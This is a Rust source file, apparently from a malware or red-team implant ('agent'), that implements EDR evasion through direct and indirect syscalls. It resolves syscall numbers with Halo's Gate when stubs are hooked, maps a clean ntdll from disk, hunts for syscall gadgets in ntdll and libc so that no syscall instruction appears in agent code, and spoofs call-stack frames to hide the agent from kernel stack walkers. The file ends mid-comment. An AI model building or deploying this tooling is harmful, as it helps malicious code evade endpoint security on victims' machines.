//! Direct/Indirect syscalls for Windows and Linux.
#![cfg(all(
    any(windows, target_os = "linux"),
    any(target_arch = "x86_64", target_arch = "aarch64"),
    feature = "direct-syscalls"
))]

use anyhow::Result;
#[cfg(windows)]
use anyhow::anyhow;
#[cfg(windows)]
use std::arch::asm;

#[cfg(windows)]
use std::sync::{Mutex, OnceLock};

#[cfg(windows)]
use std::collections::HashMap;

#[cfg(windows)]
static CLEAN_NTDLL: OnceLock<usize> = OnceLock::new();

#[cfg(windows)]
static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize)>>> = OnceLock::new();

/// Cached address of a `ret` (0xC3) byte within `ntdll!NtQuerySystemTime`.
/// When the `stack-spoof` feature is active, this address is pushed onto the
/// user-mode stack immediately before the syscall gadget is entered.  EDR
/// kernel callbacks that walk the call stack then see ntdll as the immediate
/// caller of the syscall stub instead of agent memory.
#[cfg(all(windows, feature = "stack-spoof"))]
static NTDLL_SPOOF_FRAME: OnceLock<usize> = OnceLock::new();

/// Cached SSN for `NtContinue`.
///
/// Used by the NtContinue-based stack-spoof dispatch path to call NtContinue
/// directly via `syscall` without going through `do_syscall` recursively.
/// 0 means unresolved or unavailable (fall back to `jmp`-based path).
#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
static NTCONTINUE_SSN: OnceLock<u32> = OnceLock::new();

#[cfg(windows)]
#[derive(Clone, Copy, Debug)]
pub struct SyscallTarget {
    pub ssn: u32,
    pub gadget_addr: usize,
}

// ── Linux syscall infrastructure ─────────────────────────────────────────────
// NOTE: Linux direct-syscall execution is implemented in this file below:
//   - `syscall!` macro            (Linux): around line ~1216
//   - `do_syscall(ssn, args)`     (Linux): around line ~1249
//   - `get_syscall_id(name)`      (Linux): around line ~2044
// These top-level declarations are shared state/types used by that path.

#[cfg(target_os = "linux")]
use std::sync::{Mutex, OnceLock};

#[cfg(target_os = "linux")]
use std::collections::HashMap;

/// Per-call cache: syscall name → resolved SSN.  Built lazily on first use.
/// Used by Linux `get_syscall_id` in the lower Linux implementation block.
#[cfg(target_os = "linux")]
static LINUX_SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, u32>>> = OnceLock::new();

// ── SIGSYS handler for seccomp compatibility ───────────────────────────────
//
// When a Linux seccomp filter blocks a syscall with SECCOMP_RET_TRAP,
// the kernel delivers SIGSYS to the offending thread.  Without a handler
// the default disposition is `Core` (process termination + core dump).
// By installing a lightweight handler that sets a thread-local flag, we can
// detect seccomp-blocked syscalls and return a graceful error instead of
// crashing.

/// Thread-local flag set by the SIGSYS handler when seccomp blocks a syscall.
#[cfg(all(target_os = "linux", feature = "direct-syscalls"))]
thread_local! {
    static SECCOMP_BLOCKED: std::cell::Cell<bool> = std::cell::Cell::new(false);
}

/// SIGSYS signal handler.  Sets the per-thread `SECCOMP_BLOCKED` flag so that
/// `do_syscall` can detect the blocked call and return an error.
///
/// # Safety
///
/// Called by the kernel in signal context.  Only writes to a thread-local
/// `Cell<bool>`, which is async-signal-safe.
#[cfg(all(target_os = "linux", feature = "direct-syscalls"))]
extern "C" fn sigsys_handler(
    _sig: libc::c_int,
    _info: *mut libc::siginfo_t,
    _ucontext: *mut libc::c_void,
) {
    SECCOMP_BLOCKED.with(|f| f.set(true));
}

/// Install a SIGSYS handler so that seccomp-blocked syscalls are reported via
/// an error return from `do_syscall` instead of terminating the process.
///
/// This is idempotent; calling it more than once is harmless.
///
/// Should be called once during agent initialisation, before any direct
/// syscall is attempted.
#[cfg(all(target_os = "linux", feature = "direct-syscalls"))]
pub fn install_sigsys_handler() {
    use std::mem;

    let mut sa: libc::sigaction = unsafe { mem::zeroed() };
    sa.sa_sigaction = sigsys_handler as usize;
    // SA_SIGINFO: receive siginfo_t and ucontext in the handler.
    // SA_RESTART: restart interrupted syscalls that aren't the blocked one.
    sa.sa_flags = libc::SA_SIGINFO | libc::SA_RESTART;
    unsafe {
        libc::sigemptyset(&mut sa.sa_mask);
    }

    let ret = unsafe { libc::sigaction(libc::SIGSYS, &sa, std::ptr::null_mut()) };
    if ret != 0 {
        log::error!(
            "sigsys: failed to install SIGSYS handler: {}",
            std::io::Error::last_os_error()
        );
    } else {
        log::debug!("sigsys: SIGSYS handler installed for seccomp compatibility");
    }
}

/// Minimal syscall descriptor for Linux: just the syscall number.
#[cfg(target_os = "linux")]
#[derive(Clone, Copy, Debug)]
pub struct SyscallTarget {
    pub ssn: u32,
}

// ── aarch64 Linux indirect-syscall gadget ─────────────────────────────────
//
// On aarch64 Linux, a direct `svc #0` instruction in the agent binary is a
// strong IoC.  To avoid it, we locate a `svc #0; ret` gadget inside a shared
// library that is already mapped into the process (typically libc.so) and
// branch to it via `blr`.  The gadget executes the supervisor call on behalf
// of the agent, so no `svc` instruction exists in agent code pages.

/// Cached address of a `svc #0; ret` sequence found in a loaded shared
/// library (libc).  Zero means "not yet resolved" or "unavailable".
#[cfg(all(target_os = "linux", target_arch = "aarch64", feature = "direct-syscalls"))]
static LIBC_SVC_GADGET: OnceLock<usize> = OnceLock::new();

/// Scan the executable region of libc (loaded in the current process) for an
/// 8-byte `svc #0; ret` gadget.
///
/// The aarch64 encoding is:
///   svc #0  →  `0xD4000001`  (LE bytes: `01 00 00 D4`)
///   ret     →  `0xD65F03C0`  (LE bytes: `C0 03 5F D6`)
///
/// Returns the address of the first matching gadget, or 0 if none is found.
#[cfg(all(target_os = "linux", target_arch = "aarch64", feature = "direct-syscalls"))]
fn find_libc_svc_gadget() -> usize {
    use std::fs;

    // Parse /proc/self/maps to find the first executable mapping of libc.
    let maps = match fs::read_to_string("/proc/self/maps") {
        Ok(m) => m,
        Err(_) => return 0,
    };

    for line in maps.lines() {
        // Example line:
        //   7f9a001000-7f9a020000 r-xp 00000000 fd:01 12345  /usr/lib/aarch64-linux-gnu/libc.so.6
        if !line.contains("libc") {
            continue;
        }
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 2 {
            continue;
        }
        let perms = parts[1];
        if !perms.contains('x') {
            continue; // skip non-executable mappings
        }

        // Parse address range.
        let addr_range: Vec<&str> = parts[0].split('-').collect();
        if addr_range.len() != 2 {
            continue;
        }
        let start = match usize::from_str_radix(addr_range[0], 16) {
            Ok(v) => v,
            Err(_) => continue,
        };
        let end = match usize::from_str_radix(addr_range[1], 16) {
            Ok(v) => v,
            Err(_) => continue,
        };
        let size = end.saturating_sub(start);
        if size < 8 {
            continue;
        }

        // Scan for the 8-byte gadget pattern: svc #0 (01 00 00 D4) + ret (C0 03 5F D6).
        let code = unsafe { std::slice::from_raw_parts(start as *const u8, size) };
        let pattern: [u8; 8] = [0x01, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6];
        for i in 0..=size - 8 {
            if code[i..i + 8] == pattern {
                let addr = start + i;
                log::debug!(
                    "find_libc_svc_gadget: found svc #0; ret gadget at {:#x}",
                    addr
                );
                return addr;
            }
        }
    }
    log::warn!("find_libc_svc_gadget: no svc #0; ret gadget found in libc");
    0
}

#[cfg(windows)]
fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
    unsafe {
        // Scan up to 64 bytes.  Most unhooked stubs reach `syscall` within
        // 8 bytes; 64 gives headroom for padded variants.  When an EDR hooks
        // at offset 0, none of the bytes will contain 0x0F 0x05, so this
        // function returns None and the Halo's Gate fallback takes over.
        let bytes = std::slice::from_raw_parts(func_addr as *const u8, 64);
        for j in 0..bytes.len().saturating_sub(1) {
            if bytes[j] == 0x0f && bytes[j + 1] == 0x05 {
                // syscall gadget
                for k in (0..j).rev() {
                    if bytes[k] == 0xb8 && k + 5 <= bytes.len() {
                        // mov eax, ssn
                        let ssn = u32::from_le_bytes(bytes[k + 1..k + 5].try_into().unwrap());
                        return Some(SyscallTarget {
                            ssn,
                            gadget_addr: func_addr + j,
                        });
                    }
                }
            }
        }
        None
    }
}

/// Collect the virtual addresses of all `Nt`-prefixed exports from the loaded
/// module at `module_base`.  These represent the NT syscall stubs (or their
/// hooked replacements); only the addresses matter — callers sort them by VA
/// to approximate the monotonically-increasing SSN order used by Windows.
///
/// Returns an empty `Vec` if the PE export directory cannot be read.
#[cfg(windows)]
unsafe fn collect_nt_export_vas(module_base: usize) -> Vec<usize> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64};

    let dos = &*(module_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return Vec::new(); // not a valid PE
    }
    let nt = &*((module_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let export_rva = nt.OptionalHeader.DataDirectory[0].VirtualAddress as usize;
    let export_size = nt.OptionalHeader.DataDirectory[0].Size as usize;
    if export_rva == 0 || export_size == 0 {
        return Vec::new();
    }

    let dir = &*((module_base + export_rva) as *const IMAGE_EXPORT_DIRECTORY);
    let n_names = dir.NumberOfNames as usize;
    if n_names == 0 {
        return Vec::new();
    }

    let name_rvas = std::slice::from_raw_parts(
        (module_base + dir.AddressOfNames as usize) as *const u32,
        n_names,
    );
    let ordinals = std::slice::from_raw_parts(
        (module_base + dir.AddressOfNameOrdinals as usize) as *const u16,
        n_names,
    );
    let func_rvas = std::slice::from_raw_parts(
        (module_base + dir.AddressOfFunctions as usize) as *const u32,
        dir.NumberOfFunctions as usize,
    );

    let mut result = Vec::new();
    for i in 0..n_names {
        let name_ptr = (module_base + name_rvas[i] as usize) as *const u8;
        // Accept only "Nt" followed by an uppercase letter — the signature of
        // NT syscall stubs.  This excludes "NtdllDefWindowProc" and similar
        // helper exports that are not syscall stubs.
        if *name_ptr != b'N' || *name_ptr.add(1) != b't' {
            continue;
        }
        if !(*name_ptr.add(2)).is_ascii_uppercase() {
            continue;
        }

        let ord = ordinals[i] as usize;
        if ord >= func_rvas.len() {
            continue;
        }
        let func_rva = func_rvas[ord] as usize;
        // Skip forwarded exports (RVA falls inside the export directory).
        if func_rva >= export_rva && func_rva < export_rva + export_size {
            continue;
        }
        result.push(module_base + func_rva);
    }
    result
}

/// Infer the SSN for a function at `target_addr` in `ntdll_base` using the
/// **Halo's Gate** technique.
///
/// Windows NT assigns syscall numbers in monotonically-increasing order when
/// `Nt*` exports are sorted by virtual address.  If `target_addr` is hooked
/// by an EDR (so `parse_syscall_stub` returns `None`), we sort all `Nt*` VAs,
/// locate the target's position, then scan outward through adjacent entries
/// for the first one whose stub is parseable.  The target's SSN is then:
///
///   inferred_ssn = neighbour_ssn ∓ distance
///
/// The `gadget_addr` field of the returned `SyscallTarget` is taken from the
/// neighbour's stub; callers that subsequently call `map_clean_ntdll` (which
/// performs its own gadget scan) ignore this field anyway.
///
/// Returns `None` if no parseable neighbour is found within 8 slots.
#[cfg(windows)]
unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<SyscallTarget> {
    let mut vas = collect_nt_export_vas(ntdll_base);
    if vas.is_empty() {
        return None;
    }
    vas.sort_unstable();

    let target_idx = vas.iter().position(|&va| va == target_addr)?;

    const MAX_DELTA: usize = 8;
    for delta in 1..=MAX_DELTA {
        // Higher-VA neighbour → higher SSN: inferred = neighbour_ssn - delta.
        if let Some(&upper_va) = vas.get(target_idx + delta) {
            if let Some(t) = parse_syscall_stub(upper_va) {
                if let Some(inferred) = t.ssn.checked_sub(delta as u32) {
                    log::debug!(
                        "halo_gate: SSN {} inferred for {:#x} (upper+{} SSN={})",
                        inferred, target_addr, delta, t.ssn
                    );
                    return Some(SyscallTarget { ssn: inferred, gadget_addr: t.gadget_addr });
                }
            }
        }
        // Lower-VA neighbour → lower SSN: inferred = neighbour_ssn + delta.
        if delta <= target_idx {
            if let Some(t) = parse_syscall_stub(vas[target_idx - delta]) {
                let inferred = t.ssn + delta as u32;
                log::debug!(
                    "halo_gate: SSN {} inferred for {:#x} (lower-{} SSN={})",
                    inferred, target_addr, delta, t.ssn
                );
                return Some(SyscallTarget { ssn: inferred, gadget_addr: t.gadget_addr });
            }
        }
    }
    log::warn!(
        "halo_gate: could not infer SSN for {:#x} within {} neighbours",
        target_addr, MAX_DELTA
    );
    None
}

/// Scan the `.text` section of the ntdll module loaded at `ntdll_base` for a
/// valid `syscall` (or `syscall; ret`) gadget.  Returns the address of the
/// first valid gadget found, or `None` if no valid gadget exists.
///
/// Called from `get_bootstrap_ssn` when the target Nt* stub is found to be
/// hooked so that the returned `SyscallTarget` carries a clean, unhooked
/// gadget address rather than the EDR-controlled trampoline address.
#[cfg(windows)]
unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};

    let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let p_sections = (nt as *const _ as usize
        + std::mem::size_of::<IMAGE_NT_HEADERS64>())
        as *const IMAGE_SECTION_HEADER;

    for i in 0..nt.FileHeader.NumberOfSections {
        let section = &*p_sections.add(i as usize);
        let name = &section.Name;
        if name[0] == b'.'
            && name[1] == b't'
            && name[2] == b'e'
            && name[3] == b'x'
            && name[4] == b't'
        {
            let start = ntdll_base + section.VirtualAddress as usize;
            let size = *section.Misc.VirtualSize() as usize;
            let code = std::slice::from_raw_parts(start as *const u8, size);
            for j in 0..size.saturating_sub(3) {
                if code[j] == 0x0f && code[j + 1] == 0x05 {
                    let candidate = start + j;
                    let gadget_len = if code[j + 2] == 0xc3 { 3 } else { 2 };
                    if gadget_is_valid(candidate, gadget_len) {
                        return Some(candidate);
                    }
                }
            }
            break;
        }
    }
    None
}

#[cfg(windows)]
fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
    unsafe {
        // Bootstrap resolution delegates export lookup to pe_resolve so this
        // module does not maintain a second PE export walker.
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
        let mut name = func_name.as_bytes().to_vec();
        name.push(0);
        let target_hash = pe_resolve::hash_str(&name);
        let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;

        // Explicit hook detection: inspect the first two bytes of the resolved
        // stub.  All unhooked 64-bit Nt* stubs start with one of:
        //   0x4C 0x8B D1   — MOV R10, RCX (REX.W prefix; standard syscall stub)
        //   0xB8 xx xx xx  — MOV EAX, <SSN> (less common direct-load variant)
        // An EDR hook typically overwrites byte 0 with a JMP (0xE9), PUSH, or
        // INT3 trampoline, so any other pattern implies an active hook.
        let prologue = std::slice::from_raw_parts(func_addr as *const u8, 2);
        let is_hooked = !(
            (prologue[0] == 0x4C && prologue[1] == 0x8B) // MOV R10, RCX
            || prologue[0] == 0xB8                        // MOV EAX, imm32
        );

        if !is_hooked {
            // Fast path: stub is unhooked; SSN is directly readable.
            if let Some(t) = parse_syscall_stub(func_addr) {
                return Some(t);
            }
        }

        // Hook detected (or parse failed on an unhooked stub).
        // Infer the SSN via Halo's Gate, then locate an unhooked
        // `syscall; ret` gadget in the loaded ntdll's .text section so the
        // returned gadget_addr is not inside an EDR-controlled trampoline.
        if is_hooked {
            log::warn!(
                "get_bootstrap_ssn: {func_name} stub appears hooked \
                 (prologue: {:#04x} {:#04x}); using Halo's Gate + .text gadget scan",
                prologue[0],
                prologue[1]
            );
        } else {
            log::warn!(
                "get_bootstrap_ssn: {func_name} stub prologue looks clean but \
                 parse_syscall_stub failed; falling back to Halo's Gate"
            );
        }

        let ssn_target = infer_ssn_halo_gate(ntdll_base, func_addr)?;

        if is_hooked {
            // Replace the neighbour gadget_addr with one from a direct .text
            // scan, ensuring the syscall instruction is not in a trampoline.
            if let Some(gadget_addr) = scan_text_for_syscall_gadget(ntdll_base) {
                return Some(SyscallTarget { ssn: ssn_target.ssn, gadget_addr });
            }
            log::warn!(
                "get_bootstrap_ssn: {func_name}: no clean syscall;ret gadget found \
                 in ntdll .text; using Halo's Gate neighbour gadget as fallback"
            );
        }

        Some(ssn_target)
    }
}

#[cfg(windows)]
fn map_clean_ntdll() -> Result<usize> {
    use std::os::windows::ffi::OsStrExt;

    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
    let sys_ntopenfile =
        get_bootstrap_ssn("NtOpenFile").ok_or_else(|| anyhow!("No NtOpenFile SSN"))?;
    let sys_ntcreatesection = get_bootstrap_ssn("NtCreateSection")
        .ok_or_else(|| anyhow!("No NtCreateSection SSN"))?;
    let sys_ntmapview = get_bootstrap_ssn("NtMapViewOfSection")
        .ok_or_else(|| anyhow!("No NtMapView SSN"))?;

    let mut ntdll_nt_path = format!(r"\??\{}\System32\ntdll.dll", sysroot)
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect::<Vec<u16>>();

    unsafe {
        // Resolve loaded ntdll via the shared pe_resolve module to avoid
        // maintaining a duplicate local PEB/LDR walker in this file.
        let loaded_ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| anyhow!("Could not resolve loaded ntdll base"))?;

        // Find gadget
        let mut gadget_addr = 0;
        let dos_header = loaded_ntdll_base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
        let nt_headers = (loaded_ntdll_base + (*dos_header).e_lfanew as usize)
            as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
        let p_sections = (nt_headers as usize
            + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>())
            as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
        for i in 0..(*nt_headers).FileHeader.NumberOfSections {
            let section = &*p_sections.add(i as usize);
            let name = &section.Name;
            if name[0] == b'.'
                && name[1] == b't'
                && name[2] == b'e'
                && name[3] == b'x'
                && name[4] == b't'
            {
                let start = loaded_ntdll_base + section.VirtualAddress as usize;
                let size = *section.Misc.VirtualSize() as usize;
                let code = std::slice::from_raw_parts(start as *const u8, size);
                for j in 0..size.saturating_sub(3) {  // Need at least 3 bytes: syscall + ret
                    if code[j] == 0x0f && code[j + 1] == 0x05 {
                        // M-30: Verify the syscall instruction doesn't cross a page boundary.
                        // Also verify that the byte after 0x0F 0x05 is 0xC3 (ret) to ensure
                        // we have a proper "syscall; ret" gadget, not just "syscall" followed
                        // by arbitrary code.
                        let candidate = start + j;
                        let gadget_len = if code[j + 2] == 0xc3 { 3 } else { 2 };
                        // Cross-reference: this is the primary gadget_is_valid
                        // call site (around line 140 in this file).
                        // See gadget_is_valid defined near do_syscall below.
                        if gadget_is_valid(candidate, gadget_len) {
                            gadget_addr = candidate;
                            break;
                        }
                    }
                }
                break;
            }
        }
        if gadget_addr == 0 {
            return Err(anyhow!("Failed to find syscall gadget in loaded ntdll"));
        }

        let mut obj_name: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
        obj_name.Length = ((ntdll_nt_path.len() - 1) * 2) as u16;
        obj_name.MaximumLength = (ntdll_nt_path.len() * 2) as u16;
        obj_name.Buffer = ntdll_nt_path.as_mut_ptr();

        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
        obj_attr.ObjectName = &mut obj_name;
        obj_attr.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE

        let mut io_status: [u64; 2] = [0, 0];
        let mut h_file: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();

        let status = do_syscall(
            sys_ntopenfile.ssn,
            gadget_addr,
            &[
                &mut h_file as *mut _ as u64,
                0x80100000, // SYNCHRONIZE | FILE_READ_DATA (GENERIC_READ)
                &mut obj_attr as *mut _ as u64,
                &mut io_status as *mut _ as u64,
                1,    // FILE_SHARE_READ
                0x20, // FILE_SYNCHRONOUS_IO_NONALERT
            ],
        );
        if status != 0 {
            return Err(anyhow!("NtOpenFile failed: {:x}", status));
        }

        let mut h_section: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
        let status = do_syscall(
            sys_ntcreatesection.ssn,
            gadget_addr,
            &[
                &mut h_section as *mut _ as u64,
                0x000f0000 | 0x0004 | 0x0008, // SECTION_MAP_READ | SECTION_MAP_EXECUTE | STANDARD_RIGHTS_REQUIRED
                std::ptr::null_mut::<u64>() as u64,
                std::ptr::null_mut::<u64>() as u64,
                0x20,      // PAGE_EXECUTE_READ
                0x1000000, // SEC_IMAGE
                h_file as u64,
            ],
        );

        pe_resolve::close_handle(h_file);
        if status != 0 {
            return Err(anyhow!("NtCreateSection failed: {:x}", status));
        }

        let mut base_addr: winapi::shared::ntdef::PVOID = std::ptr::null_mut();
        let mut view_size: winapi::shared::basetsd::SIZE_T = 0;

        let status = do_syscall(
            sys_ntmapview.ssn,
            gadget_addr,
            &[
                h_section as u64,
                -1isize as u64, // CurrentProcess
                &mut base_addr as *mut _ as u64,
                0,
                0,
                std::ptr::null_mut::<u64>() as u64,
                &mut view_size as *mut _ as u64,
                1, // ViewShare
                0,
                0x20, // PAGE_EXECUTE_READ
            ],
        );

        pe_resolve::close_handle(h_section);
        if status != 0 {
            return Err(anyhow!("NtMapViewOfSection failed: {:x}", status));
        }

        Ok(base_addr as usize)
    }
}

#[cfg(windows)]
fn read_export_dir(base: usize, func_name: &str) -> Result<SyscallTarget> {
    unsafe {
        let mut name = func_name.as_bytes().to_vec();
        name.push(0);
        let target_hash = pe_resolve::hash_str(&name);
        let func_addr = pe_resolve::get_proc_address_by_hash(base, target_hash)
            .ok_or_else(|| anyhow!("Function {} not found in clean ntdll", func_name))?;

        parse_syscall_stub(func_addr).ok_or_else(|| {
            anyhow!(
                "Function {} found in clean ntdll but could not parse SSN",
                func_name
            )
        })
    }
}

#[cfg(windows)]
pub fn get_syscall_id(func_name: &str) -> Result<SyscallTarget> {
    let cache_lock = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    if let Some(&(ssn, gadget_addr)) = cache_lock.lock().unwrap().get(func_name) {
        return Ok(SyscallTarget { ssn, gadget_addr });
    }

    let base = *CLEAN_NTDLL.get_or_init(|| {
        match map_clean_ntdll() {
            Ok(b) => b,
            Err(e) => {
                // Do NOT call process::exit — a hooked or unavailable stub
                // should degrade gracefully.  Callers already use `?` so the
                // returned Err below propagates without crashing the agent.
                log::warn!(
                    "get_syscall_id: could not map clean ntdll.dll: {e}; \
                     direct-syscall SSN resolution will fail for this session"
                );
                0 // sentinel: mapping unavailable
            }
        }
    });
    if base == 0 {
        return Err(anyhow!(
            "clean ntdll mapping unavailable; cannot resolve SSN for '{func_name}'"
        ));
    }

    let target = read_export_dir(base, func_name)?;
    cache_lock
        .lock()
        .unwrap()
        .insert(func_name.to_string(), (target.ssn, target.gadget_addr));
    Ok(target)
}

#[cfg(windows)]
#[macro_export]
macro_rules! syscall {
    ($func_name:expr $(, $args:expr)* $(,)?) => {{
        let target = $crate::syscalls::get_syscall_id($func_name)?;
        let args: &[u64] = &[$($args as u64),*];
        $crate::syscalls::do_syscall(target.ssn, target.gadget_addr, args)
    }};
}

/// Scan the first 64 bytes of `ntdll!NtQuerySystemTime` for a `ret` (0xC3)
/// instruction and return its address.  This address is used as the synthetic
/// return site pushed onto the stack before the syscall gadget is entered when
/// `stack-spoof` is active:
///
///   do_syscall  →(jmp)→  syscall_gadget (syscall; ret)
///                       → *this ret* inside NtQuerySystemTime (ret)
///                       → real continuation inside do_syscall
///
/// `NtQuerySystemTime` is chosen as the cover function because it is a short,
/// high-frequency stub whose call pattern is innocuous and whose `ret` is
/// reachable within the first 32 bytes on all recent Windows versions.
///
/// Returns 0 if the function cannot be resolved or contains no `ret` in the
/// first 64 bytes.
#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
fn find_ntdll_spoof_frame() -> usize {
    unsafe {
        let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
            Some(b) => b,
            None => return 0,
        };
        let func_addr = match pe_resolve::get_proc_address_by_hash(
            ntdll,
            pe_resolve::hash_str(b"NtQuerySystemTime\0"),
        ) {
            Some(a) => a,
            None => return 0,
        };
        // Scan for a `ret` (0xC3) within the first 64 bytes of the function.
        // Most NT stubs reach their `ret` well within 32 bytes; 64 gives a
        // generous margin for hooked or padded variants.
        let probe = std::slice::from_raw_parts(func_addr as *const u8, 64);
        for (i, &byte) in probe.iter().enumerate() {
            if byte == 0xC3 {
                return func_addr + i;
            }
        }
        0
    }
}

/// Resolve the SSN for `NtContinue` from the clean ntdll mapping.
///
/// This SSN is used by the NtContinue-based stack-spoof path to dispatch
/// NtContinue directly via a raw `syscall` instruction, avoiding any
/// recursive call into `do_syscall`.
///
/// Returns 0 if the SSN cannot be resolved (signals the caller to fall back
/// to the `jmp`-based spoof path).
#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
fn resolve_ntcontinue_ssn() -> u32 {
    // We need the clean ntdll base to be already mapped; use the same
    // initialisation path as get_syscall_id.  If it hasn't been mapped yet
    // we cannot proceed without risking deadlock (we may be called from a
    // context where map_clean_ntdll has not run).
    let base = match CLEAN_NTDLL.get() {
        Some(&b) if b != 0 => b,
        _ => {
            // Fall back to the loaded (potentially hooked) ntdll export.
            // If it is hooked the SSN will still be correct because the
            // hooking framework only patches the first bytes, not the
            // encoded syscall number.
            match get_bootstrap_ssn("NtContinue") {
                Some(t) => return t.ssn,
                None => return 0,
            }
        }
    };
    match read_export_dir(base, "NtContinue") {
        Ok(t) => t.ssn,
        Err(_) => 0,
    }
}

/// Verify that a gadget at `addr` of `len` bytes is safe to execute:
///   1. The entire gadget falls within a single committed memory region.
///   2. The region is executable.
///   3. The gadget does not straddle a 4KB page boundary.
///
/// Returns `true` if the gadget is safe, `false` otherwise.
///
/// Cross-reference:
/// - Primary call site: map_clean_ntdll gadget scan around line 140.
/// - Secondary call site: find_jmp_rbx_gadget near the stack-spoofing helpers.
/// - Related syscall dispatch entry: do_syscall immediately below.
#[cfg(windows)]
unsafe fn gadget_is_valid(addr: usize, len: usize) -> bool {
    use winapi::um::memoryapi::VirtualQuery;
    use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, MEM_COMMIT};

    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
    let result = VirtualQuery(
        addr as *const _,
        &mut mbi,
        std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
    );
    if result == 0 {
        return false; // VirtualQuery failed - cannot verify
    }

    // Region must be committed
    if mbi.State != MEM_COMMIT {
        return false;
    }

    // Region must be executable (PAGE_EXECUTE_*, including execute-read variants)
    const PAGE_EXECUTE: u32 = 0x10;
    const PAGE_EXECUTE_READ: u32 = 0x20;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
    let prot = mbi.Protect;
    let is_exec = prot == PAGE_EXECUTE
        || prot == PAGE_EXECUTE_READ
        || prot == PAGE_EXECUTE_READWRITE
        || prot == PAGE_EXECUTE_WRITECOPY;
    if !is_exec {
        return false;
    }

    // The entire gadget must fit within this memory region
    let region_end = mbi.BaseAddress as usize + mbi.RegionSize;
    if addr + len > region_end {
        return false;
    }

    // The gadget must not straddle a 4KB page boundary.
    // This is a stronger check: even if both pages are in the same region,
    // a gadget crossing a page boundary can cause issues if the second page
    // has different TLB entries or is guarded.
    let page_start = addr & !0xFFF;
    let page_end = page_start + 0x1000;
    if addr + len > page_end {
        return false;
    }

    true
}

#[cfg(windows)]
#[doc(hidden)]
#[inline(never)]
pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
    #[cfg(target_arch = "x86_64")]
    {
        let a1 = args.get(0).copied().unwrap_or(0);
        let a2 = args.get(1).copied().unwrap_or(0);
        let a3 = args.get(2).copied().unwrap_or(0);
        let a4 = args.get(3).copied().unwrap_or(0);
        let stack_args: &[u64] = if args.len() > 4 { &args[4..] } else { &[] };
        let nstack: usize = stack_args.len();
        let stack_ptr: *const u64 = stack_args.as_ptr();
        let status: i32;

        // Resolve the synthetic ntdll return-site for call-stack spoofing.
        // When `stack-spoof` is active and the gadget is found, this value is
        // pushed as a fake frame so EDR walkers see ntdll as the caller.
        // When the feature is disabled or the gadget is unavailable, the value
        // is 0 and the `jz 44f` branch inside the asm falls back to the plain
        // `call r11` path with no additional overhead beyond a single test+jz.
        #[cfg(feature = "stack-spoof")]
        let spoof_frame: usize =
            *NTDLL_SPOOF_FRAME.get_or_init(|| find_ntdll_spoof_frame());
        #[cfg(not(feature = "stack-spoof"))]
        let spoof_frame: usize = 0;

        // ── NtContinue-based stack-spoof dispatch ─────────────────────────
        // When both `spoof_frame` and `NtContinue`'s SSN are available we use
        // a fundamentally different dispatch strategy that closes the APC race
        // window present in the simple `jmp r11` approach:
        //
        // Problem with `jmp r11`:
        //   After we push the fake return chain and execute `jmp r11`, if the
        //   kernel delivers an APC or exception between the `jmp` and the
        //   `syscall` instruction, the trap frame records RIP = gadget_addr
        //   and the return address at [Rsp] as the user-mode return site.
        //   Because we pushed `lea r15, [rip+43f]` (agent code) as the second
        //   frame, advanced EDR stack walkers can see an agent-code address one
        //   level above the ntdll spoof frame.
        //
        // NtContinue solution:
        //   Instead of manipulating the stack in user mode and jumping to the
        //   gadget, we build a CONTEXT record that describes where execution
        //   should resume (Rip = syscall gadget, all argument registers set,
        //   Rsp pointing to a stack that has [spoof_frame, continuation] on
        //   top) and call NtContinue via a direct `syscall` instruction.
        //   The kernel itself then performs the context switch.  Any trap frame
        //   the kernel constructs during APC delivery or exception dispatch
        //   between our `syscall` (for NtContinue) and the eventual `syscall`
        //   instruction at the gadget will show Rsp→spoof_frame (ntdll) as the
